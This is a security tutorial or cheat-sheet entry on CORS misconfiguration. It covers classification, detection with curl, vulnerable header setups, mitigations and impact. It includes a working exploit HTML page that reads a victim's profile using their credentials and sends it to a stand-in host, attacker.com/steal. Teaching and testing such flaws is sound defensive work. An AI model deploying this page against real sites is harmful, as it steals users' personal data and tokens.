📌 CORS Misconfiguration

🧠 Description

What is CORS?

Cross-Origin Resource Sharing (CORS) is a mechanism that allows restricted resources on a web page to be requested from another domain. A misconfigured CORS policy can allow malicious websites to access sensitive data from your application.

Why does it occur?

Developers configure CORS headers too permissively (e.g., Access-Control-Allow-Origin: * or dynamically reflecting the Origin header without validation).

🏷️ Classification

  • Type: Security Misconfiguration
  • OWASP: A01:2021 – Broken Access Control
  • CWE: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

🎯 Attack Surface

  • ✅ API endpoints returning sensitive data
  • ✅ Endpoints with Access-Control-Allow-Origin: *
  • ✅ Endpoints that reflect Origin header without validation
  • ✅ Endpoints with Access-Control-Allow-Credentials: true

🔍 Detection Methodology

# Check CORS headers using curl
curl -H "Origin: https://attacker.com" -I https://target.com/api/data

# Look for these headers:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true
# Access-Control-Allow-Methods: GET, POST, PUT, DELETE

💣 Vulnerable Configurations

⚠️ Dangerous CORS Configurations
# Vulnerable - Wildcard with credentials
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# Vulnerable - Reflecting arbitrary Origin
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

# Vulnerable - Null origin
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Vulnerable - Regex bypass using subdomains
Access-Control-Allow-Origin: https://target.com.attacker.com

⚙️ Exploitation Steps

  1. Identify endpoint with CORS headers
  2. Check if Access-Control-Allow-Origin reflects the Origin header
  3. Check if credentials are allowed (Access-Control-Allow-Credentials: true)
  4. Create malicious HTML page to steal data
  5. Trick victim into visiting the page
🎯 Exploit HTML Page
<!DOCTYPE html>
<html>
<body>
<script>
  fetch('https://target.com/api/user/profile', {
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
  });
</script>
</body>
</html>

🛡️ Mitigation

✅ Avoid wildcard (*) with credentials: Never use Access-Control-Allow-Origin: * with credentials
✅ Whitelist allowed origins: Maintain a strict list of trusted domains
✅ Don't reflect Origin header: Never dynamically echo the Origin header without validation
✅ Use Vary: Origin header: Prevent caching issues
✅ Limit allowed methods: Only expose necessary HTTP methods
✅ Prefer same-origin when possible: Keep APIs on the same domain 
# Secure CORS Configuration (Apache)
Header set Access-Control-Allow-Origin "https://trusted-domain.com"
Header set Access-Control-Allow-Credentials "true"
Header set Vary "Origin"

# Secure CORS Configuration (Nginx)
add_header 'Access-Control-Allow-Origin' 'https://trusted-domain.com' always;
add_header 'Access-Control-Allow-Credentials' 'true' always;
add_header 'Vary' 'Origin' always;

⚠️ Risk / Impact

Severity: Medium to High

Impact:
  • Data theft (PII, API keys, tokens)
  • Session hijacking
  • CSRF-style attacks across origins
  • Reading sensitive API responses
